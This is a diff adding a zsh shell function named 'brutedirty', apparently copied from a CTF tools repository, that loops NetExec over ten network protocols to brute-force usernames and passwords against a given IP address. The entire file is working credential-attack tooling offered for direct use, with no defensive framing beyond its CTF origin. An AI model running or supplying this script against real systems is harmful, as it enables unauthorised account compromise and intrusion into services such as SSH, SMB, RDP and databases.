@@ -1,0 +1,40 @@
+# copied from JunglistHyperD (github.com/JunglistHyperD/CTF_Tools/BashThings.md
+# add as a function to your .zshrc file
+
+brutedirty() {
+    local target userinput passinput useropt passopt
+    target="$1"
+    userinput="$2"
+    passinput="$3"
+
+    if [[ -z "$target" || -z "$userinput" || -z "$passinput" ]]; then
+        echo "Usage: brutedirty <ip> <username OR userfile> <password OR passfile>"
+        return 1
+    fi
+
+    # Use -u for both single username OR file
+    if [[ -f "$userinput" ]]; then
+        useropt=(-u "$userinput")
+        echo "[*] Detected user file with $(wc -l < "$userinput") entries."
+    else
+        useropt=(-u "$userinput")
+        echo "[*] Using single username: $userinput"
+    fi
+
+    # Use -p for both single password OR file
+    if [[ -f "$passinput" ]]; then
+        passopt=(-p "$passinput")
+        echo "[*] Detected password file with $(wc -l < "$passinput") entries."
+    else
+        passopt=(-p "$passinput")
+        echo "[*] Using single password: $passinput"
+    fi
+
+    local protocols=(ssh ftp smb ldap rdp winrm wmi mssql vnc nfs)
+    echo -e "\n[*] Brute-forcing $target..."
+
+    for proto in "${protocols[@]}"; do
+        echo -e "\n[*] ------ Testing protocol: $proto ------"
+        nxc "$proto" "$target" "${useropt[@]}" "${passopt[@]}" --continue-on-success
+    done
+}
